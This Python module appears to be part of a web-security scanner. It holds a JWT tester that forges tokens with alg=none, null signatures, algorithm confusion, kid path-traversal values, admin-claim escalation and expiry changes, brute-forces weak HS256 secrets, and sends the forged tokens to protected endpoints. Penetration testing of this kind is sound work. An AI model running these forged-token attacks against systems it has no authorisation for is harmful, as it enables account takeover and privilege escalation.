from __future__ import annotations
import json
import base64
import logging
import re
import time as _time
import hmac
import hashlib
from typing import Dict, List, Optional
from .base import BaseScanner

logger = logging.getLogger(__name__)

_PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/admin", "/admin",
    "/dashboard", "/profile", "/api/v1/user", "/api/v1/admin",
]

_AUTH_ERROR_KEYWORDS = frozenset([
    "invalid", "unauthorized", "login required", "sign in", "forbidden",
    "authentication failed", "token expired", "not authorized", "access denied",
    "please login", "must be logged in",
])


class JWTScanner(BaseScanner):
    """
    Advanced JWT Security Scanner.

    Attacks performed:
    - alg=none (4 case variants)
    - Null signature (keep alg, strip sig)
    - HS256 brute-force against wordlist
    - RS256/ES256 → HS256 algorithm confusion (public key as HMAC secret)
    - KID path traversal (/dev/null → empty secret)
    - JKU / X5U header injection risk detection
    - Claim escalation (role, admin, scope, sub)
    - Expiry bypass (expired token acceptance, far-future exp)

    Verification: anon-baseline comparison eliminates false positives.
    """

    name = "jwt"

    _KID_PAYLOADS = [
        "/dev/null",
        "../../dev/null",
        "../../../dev/null",
        "../../../../dev/null",
        "/proc/sys/kernel/randomize_va_space",
        "",
    ]

    _CLAIM_ESCALATION: Dict[str, List] = {
        "role":        ["admin", "administrator", "superuser", "root"],
        "roles":       [["admin"], ["administrator"]],
        "is_admin":    [True, 1],
        "admin":       [True, 1],
        "scope":       ["admin", "admin read write", "openid profile admin"],
        "group":       ["admin", "administrators"],
        "permissions": [["admin", "write", "read"], ["*"]],
        "tier":        ["premium", "enterprise", "admin"],
        "type":        ["admin", "superadmin"],
        "sub":         ["0", "1", "admin"],
        "user_type":   ["admin", "staff"],
    }

    def run(self, url: str) -> int:
        bucket = self.name
        self.results[bucket] = []
        vulns = 0

        tokens = self._find_tokens()
        if not tokens:
            logger.debug("[JWT] No tokens found in session")
            return 0

        protected_urls = self._build_protected_urls(url)

        for token in set(tokens):
            vulns += self._analyze_token(token, url, protected_urls, bucket)

        self.set_summary(bucket, vulns)
        return vulns

    # -------------------------------------------------------------------------
    # Token discovery
    # -------------------------------------------------------------------------

    def _find_tokens(self) -> List[str]:
        candidates = []
        auth = self.session.headers.get("Authorization", "")
        if "Bearer" in auth and len(auth.split()) >= 2:
            candidates.append(auth.split(None, 1)[1].strip())
        jwt_pattern = re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*")
        for c in self.session.cookies:
            if jwt_pattern.match(c.value or ""):
                candidates.append(c.value)
        return candidates

    def _build_protected_urls(self, base_url: str) -> List[str]:
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(base_url)
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        urls = [base_url]
        for path in _PROTECTED_PATHS:
            urls.append(base.rstrip("/") + path)
        return urls[:8]  # cap to avoid excessive requests

    # -------------------------------------------------------------------------
    # Per-token analysis
    # -------------------------------------------------------------------------

    def _analyze_token(self, token: str, url: str, protected_urls: List[str], bucket: str) -> int:
        vulns = 0
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return 0

            header = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))

            self.add(bucket, {
                "type": "JWT Info", "severity": "Info",
                "details": "JWT Decoded",
                "metadata": {"header": header, "payload": payload},
            })

            if self._attack_none_alg(header, payload, protected_urls):
                self.add(bucket, {
                    "type": "JWT 'None' Algorithm", "severity": "Critical", "url": url,
                    "details": "Server accepts alg:none — signature verification is disabled",
                })
                vulns += 1

            if self._attack_null_sig(header, payload, protected_urls):
                self.add(bucket, {
                    "type": "JWT Null Signature", "severity": "Critical", "url": url,
                    "details": "Server accepts empty/stripped signature",
                })
                vulns += 1

            vulns += self._attack_hs256_brute(header, payload, token, bucket, url)
            vulns += self._attack_rs256_hs256(header, payload, protected_urls, bucket, url)
            vulns += self._attack_kid_traversal(header, payload, protected_urls, bucket, url)
            vulns += self._attack_jku_x5u(header, payload, bucket, url)
            vulns += self._attack_claim_escalation(header, payload, protected_urls, bucket, url)
            vulns += self._attack_expiry_bypass(header, payload, protected_urls, bucket, url)

        except Exception as e:
            logger.debug(f"[JWT] Scan error for token: {e}")
        return vulns

    # -------------------------------------------------------------------------
    # Attack 1: alg=none
    # -------------------------------------------------------------------------

    def _attack_none_alg(self, header: Dict, payload: Dict, urls: List[str]) -> bool:
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        for alg_val in ("none", "None", "NONE", "nOnE"):
            h_enc = self._b64e(json.dumps({**header, "alg": alg_val}, separators=(",", ":")))
            for token in (f"{h_enc}.{p_enc}.", f"{h_enc}.{p_enc}. "):
                for url in urls:
                    if self._verify_access(url, token.strip()):
                        return True
        return False

    # -------------------------------------------------------------------------
    # Attack 2: Null signature (keep original alg, remove sig bytes)
    # -------------------------------------------------------------------------

    def _attack_null_sig(self, header: Dict, payload: Dict, urls: List[str]) -> bool:
        h_enc = self._b64e(json.dumps(header, separators=(",", ":")))
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        for token in (f"{h_enc}.{p_enc}.", f"{h_enc}.{p_enc}. "):
            for url in urls:
                if self._verify_access(url, token.strip()):
                    return True
        return False

    # -------------------------------------------------------------------------
    # Attack 3: HS256 brute-force
    # -------------------------------------------------------------------------

    def _attack_hs256_brute(
        self, header: Dict, payload: Dict, token_str: str, bucket: str, url: str
    ) -> int:
        if header.get("alg", "").upper() != "HS256":
            return 0

        candidates: List[str] = []
        try:
            from websecure.core.payloads import load_external_payloads
            ext = load_external_payloads("jwt_secrets")
            if ext:
                candidates.extend(ext)
        except ImportError:
            pass

        if not candidates:
            candidates = [
                "secret", "123456", "password", "jwt", "test", "change_me",
                "your-256-bit-secret", "qwerty", "admin", "supersecret",
                "secret123", "letmein", "abc123", "", "jwt_secret", "hs256secret",
                "access_token_secret", "refresh_token_secret", "s3cr3t", "p@ssw0rd",
            ]

        parts = token_str.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        for secret in candidates:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            ).decode().rstrip("=")
            if sig == original_sig:
                self.add(bucket, {
                    "type": "JWT Weak Secret", "severity": "Critical", "url": url,
                    "details": f"HS256 secret cracked: '{secret}'",
                })
                return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 4: RS256/ES256 → HS256 algorithm confusion
    # -------------------------------------------------------------------------

    def _attack_rs256_hs256(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        alg = header.get("alg", "").upper()
        if alg not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256"):
            return 0

        public_keys = self._fetch_public_keys(url, header)
        if not public_keys:
            public_keys = [b"", b"public", b"secret"]

        h = {**header, "alg": "HS256"}
        h_enc = self._b64e(json.dumps(h, separators=(",", ":")))
        p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
        signing_input = f"{h_enc}.{p_enc}".encode()

        for key in public_keys:
            if isinstance(key, str):
                key = key.encode()
            sig = base64.urlsafe_b64encode(
                hmac.new(key, signing_input, hashlib.sha256).digest()
            ).decode().rstrip("=")
            token = f"{h_enc}.{p_enc}.{sig}"
            for target_url in urls:
                if self._verify_access(target_url, token):
                    self.add(bucket, {
                        "type": "JWT RS256→HS256 Algorithm Confusion", "severity": "Critical",
                        "url": url,
                        "details": (
                            "Server accepted a token where the RS256 public key was used as the "
                            "HS256 HMAC secret — classic algorithm confusion attack"
                        ),
                    })
                    return 1
        return 0

    def _fetch_public_keys(self, url: str, header: Dict) -> List[bytes]:
        """Attempt to retrieve RSA public key bytes from JWKS endpoints."""
        keys: List[bytes] = []
        try:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(url)
            base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
            jwks_paths = [
                "/.well-known/jwks.json", "/jwks.json",
                "/oauth2/jwks", "/auth/jwks", "/api/auth/jwks",
                "/.well-known/openid-configuration",
            ]
            for path in jwks_paths:
                try:
                    r = self.session.get(base + path, timeout=5)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    # openid-configuration → follow jwks_uri
                    if "jwks_uri" in data:
                        r2 = self.session.get(data["jwks_uri"], timeout=5)
                        if r2.status_code == 200:
                            data = r2.json()
                    for k in data.get("keys", []):
                        if k.get("kty") == "RSA" and "n" in k:
                            n_bytes = base64.urlsafe_b64decode(k["n"] + "==")
                            keys.append(n_bytes)
                    if keys:
                        break
                except Exception:
                    pass
        except Exception:
            pass
        return keys

    # -------------------------------------------------------------------------
    # Attack 5: KID path traversal
    # -------------------------------------------------------------------------

    def _attack_kid_traversal(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        if "kid" not in header:
            return 0

        for kid_val in self._KID_PAYLOADS:
            h = {**header, "kid": kid_val, "alg": "HS256"}
            h_enc = self._b64e(json.dumps(h, separators=(",", ":")))
            p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
            signing_input = f"{h_enc}.{p_enc}".encode()
            # /dev/null and "" → empty file content → HMAC(b"", ...) or HMAC(b"\x00", ...)
            for secret in (b"", b"\x00", b"null"):
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret, signing_input, hashlib.sha256).digest()
                ).decode().rstrip("=")
                token = f"{h_enc}.{p_enc}.{sig}"
                for target_url in urls:
                    if self._verify_access(target_url, token):
                        self.add(bucket, {
                            "type": "JWT KID Path Traversal", "severity": "Critical",
                            "url": url,
                            "details": (
                                f"Server accepted token where kid='{kid_val}' resolves to an "
                                "empty or null file, allowing signature bypass"
                            ),
                        })
                        return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 6: JKU / X5U header injection
    # -------------------------------------------------------------------------

    def _attack_jku_x5u(self, header: Dict, payload: Dict, bucket: str, url: str) -> int:
        present = [k for k in ("jku", "x5u", "jwk") if k in header]
        if not present:
            return 0
        self.add(bucket, {
            "type": "JWT JKU/X5U Header Present — Remote Key Injection Risk", "severity": "High",
            "url": url,
            "details": (
                f"Token header contains {present}. "
                "Without strict domain allowlisting, an attacker can host a malicious JWKS "
                "at an arbitrary URL and forge tokens accepted by the server."
            ),
        })
        return 1

    # -------------------------------------------------------------------------
    # Attack 7: Claim escalation
    # -------------------------------------------------------------------------

    def _attack_claim_escalation(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        for claim, escalated_values in self._CLAIM_ESCALATION.items():
            if claim not in payload:
                continue
            original_val = payload[claim]
            for escalated_val in escalated_values:
                if escalated_val == original_val:
                    continue
                new_payload = {**payload, claim: escalated_val}
                for alg_val in ("none", "None"):
                    h = {**header, "alg": alg_val}
                    token = (
                        f"{self._b64e(json.dumps(h, separators=(',', ':')))}"
                        f".{self._b64e(json.dumps(new_payload, separators=(',', ':')))}"
                        f"."
                    )
                    for target_url in urls:
                        if self._verify_access(target_url, token):
                            self.add(bucket, {
                                "type": "JWT Claim Escalation", "severity": "Critical",
                                "url": url,
                                "details": (
                                    f"Claim '{claim}' escalated: "
                                    f"{original_val!r} → {escalated_val!r} — "
                                    "server accepted tampered token"
                                ),
                            })
                            return 1
        return 0

    # -------------------------------------------------------------------------
    # Attack 8: Expiry bypass
    # -------------------------------------------------------------------------

    def _attack_expiry_bypass(
        self, header: Dict, payload: Dict, urls: List[str], bucket: str, url: str
    ) -> int:
        now = int(_time.time())
        test_cases = [
            ({**payload, "exp": 1, "iat": 0, "nbf": 0}, "expired (exp=1, epoch 1970)"),
            ({**payload, "exp": now - 86400, "iat": now - 172800}, "expired 24h ago"),
            ({**payload, "exp": now + 100 * 365 * 24 * 3600}, "far-future exp (+100 years)"),
        ]
        for test_payload, label in test_cases:
            for alg_val in ("none", "None"):
                h = {**header, "alg": alg_val}
                token = (
                    f"{self._b64e(json.dumps(h, separators=(',', ':')))}"
                    f".{self._b64e(json.dumps(test_payload, separators=(',', ':')))}"
                    f"."
                )
                for target_url in urls:
                    if self._verify_access(target_url, token):
                        self.add(bucket, {
                            "type": "JWT Expiry Bypass", "severity": "High",
                            "url": url,
                            "details": f"Server accepted token with {label}",
                        })
                        return 1
        return 0

    # -------------------------------------------------------------------------
    # Verification helper
    # -------------------------------------------------------------------------

    def _verify_access(self, url: str, token: str) -> bool:
        """
        Returns True only if:
        1. Anon request to same URL returns non-200 (endpoint is protected)
        2. Token-bearing request returns 200/201/204
        3. Response does NOT contain auth-error keywords
        This two-step check eliminates false positives from public endpoints.
        """
        try:
            anon_r = self.session.get(url, headers={"Authorization": ""}, timeout=5)
            if anon_r.status_code == 200:
                return False  # public endpoint — not a real bypass

            r = self.session.get(
                url, headers={"Authorization": f"Bearer {token}"}, timeout=5
            )
            if r.status_code not in (200, 201, 204):
                return False
            lower = r.text.lower()
            return not any(kw in lower for kw in _AUTH_ERROR_KEYWORDS)
        except Exception:
            return False

    # -------------------------------------------------------------------------
    # Base64 helpers
    # -------------------------------------------------------------------------

    def _b64e(self, s: str) -> str:
        return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

    def _b64d(self, s: str) -> str:
        padded = s + "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(padded).decode()


def run(url: str, session=None, debug: bool = False, **kwargs) -> int:
    """Module-level adapter for generic runners."""
    scanner = JWTScanner(session=session, debug=debug)
    if "results" in kwargs and isinstance(kwargs["results"], dict):
        scanner.results = kwargs["results"]
    return scanner.run(url)
